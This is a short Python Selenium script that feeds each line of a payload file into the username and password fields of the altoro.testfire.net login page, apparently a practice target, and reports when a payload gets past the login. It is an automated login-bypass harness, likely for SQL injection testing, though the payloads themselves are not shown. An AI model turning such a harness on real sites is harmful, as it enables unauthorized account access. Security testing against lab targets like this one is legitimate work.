from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time
import requests

def check_success(driver, initial_url):
    current_url = driver.current_url
    if current_url != initial_url:
        return True, current_url
    else:
        return False, current_url

def get_status_code_and_headers(url):
    response = requests.get(url)
    return response.status_code, response.headers

def main():
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

    try:
        initial_url = "http://altoro.testfire.net/login.jsp"
        driver.get(initial_url)

        with open("login.txt", "r") as file:
            for line in file:
                # Strip any leading/trailing whitespace from the line
                payload = line.strip()

                # Find the input fields and insert the payload
                input1 = driver.find_element(By.ID, "uid")
                input1.clear()
                input1.send_keys(payload)

                input2 = driver.find_element(By.ID, "passw")
                input2.clear()
                input2.send_keys(payload)

                # Click the login button
                login_button = driver.find_element(By.NAME, "btnSubmit")
                login_button.click()

                # Wait for the page to load
                time.sleep(5)

                # Check if the login was successful
                success, current_url = check_success(driver, initial_url)
                status_code, headers = get_status_code_and_headers(current_url)

                if success:
                    print("Login successful")
                    print("Status Code:", status_code)
                    print("Response Headers:", headers)
                    break
                else:
                    print(f"Login unsuccessful with payload: {payload}")

    finally:
        driver.quit()

if __name__ == "__main__":
    main()
